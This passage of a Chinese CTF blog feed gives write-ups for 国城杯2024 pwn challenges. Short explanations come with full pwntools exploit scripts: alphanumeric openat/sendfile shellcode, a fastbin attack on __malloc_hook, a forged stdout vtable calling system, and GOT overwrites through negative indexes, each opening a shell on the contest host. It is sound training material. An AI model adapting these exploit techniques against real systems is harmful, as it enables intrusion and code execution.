class="hljs-number">0x602058</span>)<br>payload1 = payload1.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload1)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x3b</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>io.sendline(<span class="hljs-string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国城杯2024wp</title>
    <link href="/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/"/>
    <url>/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h4><p>填问卷即得flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h4><p>禁用了一大串系统调用，拿shell肯定是别想了，只能走orw。但是传统的orw路线给ban了，只能走<code>openat</code>+<code>sendfile</code>。  </p><blockquote><p>注意，使用<code>pwrite</code>是不行的，pwrite过程会调用write函数，会导致系统调用无法执行。详见源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41</a></p></blockquote><p>另外此题还限制了可见字符shellcode，需要用<code>alpha3</code>生成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31796</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+428)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                s</span><br><span class="hljs-comment">#                catch syscall</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>flag = <span class="hljs-number">0x100000900</span><br><br>payload = shellcraft.openat(-<span class="hljs-number">100</span>, <span class="hljs-string">&quot;flag&quot;</span>)<br>payload += shellcraft.sendfile(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)<br>payload+= shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ss&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(asm(payload))<br>    <br>sc = <span class="hljs-string">b&quot;&quot;&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf\</span><br><span class="hljs-string">    1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3F7k\</span><br><span class="hljs-string">        4l0l1138124P0U3n060j7k0i0Z180p0k0Y090\</span><br><span class="hljs-string">            n133v2Z032k0Y0F0h09051k3X112l017o1o01&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sc))<br>io.send(sc)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h4><p>此题可以直接打<code>__malloc_hook</code>，利用unsortedbin泄露libc+fastbin attack打malloc_hook即可拿到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31126</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>og = libc_base + <span class="hljs-number">0xd5c07</span><br><br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x13</span>+p64(og))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>补充一下打vtable的方法。官方wp的堆布置策略有问题，会报错。<br>下面的exp打vtable时麻烦了，其实可以直接打<code>puts</code>。                                                                                                                                                                                                                                                     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                b execve</span><br><span class="hljs-comment">#                b exit </span><br><span class="hljs-comment">#                b _IO_unbuffer_all</span><br><span class="hljs-comment">#                b _IO_cleanup</span><br><span class="hljs-comment">#                b system</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31287</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;libc&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>xsputns = libc_base + <span class="hljs-number">0x70b60</span><br>overflow = libc_base + <span class="hljs-number">0x71880</span><br>IO_write = libc_base + <span class="hljs-number">0x70650</span><br>og = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>fake_heap = stdout_vtable_ptr-<span class="hljs-number">0x3b</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><br>fake_data = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x00ffffffff000000</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>* (<span class="hljs-number">0xb</span>+<span class="hljs-number">8</span>)+ p64(heap_1_addr+<span class="hljs-number">0x180</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(fake_heap))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br>fake_vtable = p64(og)* <span class="hljs-number">3</span> + p64(overflow)+ p64(og)*<span class="hljs-number">3</span>+ p64(xsputns) +p64(og)*<span class="hljs-number">3</span> +p64(og)+ p64(og)*<span class="hljs-number">3</span>  + p64(IO_write)<br>edit(<span class="hljs-number">5</span>, fake_vtable)<br>edit(<span class="hljs-number">4</span>, fake_data)<br><br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;og&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(og)&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">6</span>)<br>stdout_fake_heap = libc_base+libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="hljs-number">0x43</span><br>edit(<span class="hljs-number">6</span>, p64(stdout_fake_heap))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x33</span>+p32(<span class="hljs-number">0xfbad1880</span>)+<span class="hljs-string">b&quot;;sh;\x00&quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h4 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h4><blockquote><p>这题容器有问题，反馈后也没修好，只能赛后加分……</p></blockquote><p>经典负数索引利用。打随机数就不赘述了，直接说攻击流程。首先篡改<code>exit</code>的got表到<code>buy</code>函数上，让程序陷入循环；再泄露<code>puts</code>地址，拿到libc基地址；再篡改<code>printf</code>got表到<code>system</code>函数上；最后篡改<code>exit</code>的got表到那个<code>printf(&quot;/bin/sh&quot;)</code>的函数上即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>librand = ctypes.cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b buy</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span> ,<span class="hljs-number">31819</span>)<br>buy = <span class="hljs-number">0x40133b</span><br>backdoor = <span class="hljs-number">0x401511</span><br>io.sendafter(<span class="hljs-string">b&quot;input yours id\n&quot;</span>, <span class="hljs-string">b&quot;name&quot;</span>)<br>librand.srand(librand.time(<span class="hljs-number">0</span>)) <br>rand_byte = <span class="hljs-built_in">str</span>(librand.rand()).encode()<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(rand_byte)<br><span class="hljs-built_in">print</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]-libc.sym[<span class="hljs-string">&quot;puts&quot;</span>])<br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(buy))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-8&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, <span class="hljs-string">b&quot;\x50&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;succeed\n&quot;</span>)<br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = <span class="hljs-number">0x4021c2</span><br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-7&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(backdoor))<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h4><p>先打格式化字符串绕过第一个检查。接下来是两个线程，都没加锁，数据共享，其中<code>guess</code>加载得快些，也就给了我们篡改相应值、绕过login检查的机会。 首先快速给guess发送一个1，sleep之后再给checker发一个1，就实现了绕过。<br>login成功后是一个栈溢出，考虑构造ROP链。但题目没给libc，那就只能考虑利用现有函数了。注意到<code>printer</code>函数是读取某个文件并将其内容输出，也就是说我们只需要控制<code>rdi</code>寄存器的值为<code>flag</code>字符串的地址即可。这里套用<code>fluff</code>题目的板子构造ROP链把flag写到data段上，再pop rdi即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b login</span><br><span class="hljs-comment">#               